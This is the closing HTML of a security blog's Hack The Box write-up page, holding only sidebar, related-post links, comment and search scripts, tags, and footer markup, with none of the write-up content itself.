                                        <i class="fa-fw fab fa-facebook-square mr-1"></i>
                                    </a>
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank">
                                        <i class="fa-fw fab fa-telegram mr-1"></i>
                                    </a>
                                    <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
                <div class="access">
                    <div id="access-lastmod" class="post mb-4">
                        <h3 data-toc-skip>Recent Update</h3>
                        <ul class="post-content pl-0 pb-1 ml-1 mt-2">
                            <li>
                                <a href="/posts/htb-pivotapi/">Hackthebox Pivotapi writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-love/">Hackthebox Love writeup</a>
                            </li>
                            <li>
                                <a href="/posts/htb-monitors/">Hackthebox Monitors writeup</a>
                            </li>
                        </ul>
                    </div>
                    <div id="access-tags">
                        <script async="async" data-cfasync="false" src="//contributorshaveangry.com/12712f6b55ac81fa45e77d0da10aee84/invoke.js"></script>
                        <div id="container-12712f6b55ac81fa45e77d0da10aee84"></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <div class="post-navigation d-flex justify-content-between">
                        <a href="/posts/htb-atom/" class="btn btn-outline-primary">
                            <p>Hackthebox Atom writeup</p>
                        </a>
                        <a href="/posts/htb-monitors/" class="btn btn-outline-primary">
                            <p>Fortress Monitors writeup</p>
                        </a>
                    </div>
                    <!-- Disqus  -->
                    <script id="dsq-count-scr" src="//0xdedinfosec.disqus.com/count.js" async></script>
                    <div id="disqus_thread"></div>
                    <script>
                    var disqus_config = function () {
                    this.page.url = 'https://0xdedinfosec.github.io/posts/htb-pivotapi/';  
                    this.page.identifier = '/posts/htb-pivotapi/';
                    };
                    (function() {
                    var d = document, s = d.createElement('script');
                    s.src = 'https://0xdedinfosec.disqus.com/embed.js';
                    s.setAttribute('data-timestamp', +new Date());
                    (d.head || d.body).appendChild(s);
                    })();
                    </script>
                    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                            
                    <!-- Disqus end -->
                    <div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2">
                        <h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
                        <div class="card-deck mb-4">
                            <div class="card">
                                <a href="/posts/htb-monitors/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Apr 29, 2021 <i class="unloaded">2021-04-29T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Monitors writeup</h3>
                                        <div class="text-muted small">
                                            <p>information Column Details Name Monitors IP 10.10.10.238 Points 40 Os Linux ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/hackthebox-reel2/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Oct 05, 2020 <i class="unloaded">2020-10-05T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Reel2 writeup</h3>
                                        <div class="text-muted small">
                                            <p>information@Sauna:~$ Column Details Name Reel2 IP 10.10.10.210 Points 40 Os Windo...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                            <div class="card">
                                <a href="/posts/htb-doctor/">
                                    <div class="card-body">
                                        <span class="timeago small">
                                            Sep 28, 2020 <i class="unloaded">2020-09-28T00:00:00+00:00</i>
                                        </span>
                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Doctor writeup</h3>
                                        <div class="text-muted small">
                                            <p>Information@openadmin:~$ Column Details Name Doctor IP 10.10.10.209 Points 20 Os ...</p>
                                        </div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
        <script type="text/javascript">
            const observer = lozad();
            observer.observe();
        </script>
        <footer class="d-flex w-100 justify-content-center">
            <div class="d-flex justify-content-between align-items-center">
                <div class="footer-left">
</p></div>
<p class="mb-0">
    © <span id="year"></span> <a href="https://www.facebook.com/dedsecinfoServices/">Dedinfosec</a>
    . <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span>
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="DEDINFOSEC88" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#FFDD00" data-position="right" data-x_margin="18" data-y_margin="18"></script>
</footer></div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
    <div class="col-12 col-xl-11 post-content">
        <div id="search-hints">
            <h4 class="text-muted">Trending Tags</h4>
            <a class="post-tag" href="/tags/cve/">CVE</a>
            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
            <a class="post-tag" href="/tags/ftp/">FTP</a>
            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
            <a class="post-tag" href="/tags/jackson/">Jackson</a>
            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
        </div>
        <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
    </div>
</div>
</div><div id="mask"></div>
<a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button">
    <i class="fas fa-angle-up"></i>
</a>
<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script>
<script>
    SimpleJekyllSearch({
        searchInput: document.getElementById('search-input'),
        resultsContainer: document.getElementById('search-results'),
        json: '/assets/data/search.json',
        searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xdedinfosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
        noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
    });
</script>
<script>
    $(document).ready(function(){
        $('#year').text(new Date().getFullYear());
    });
</script>
</body>
</html>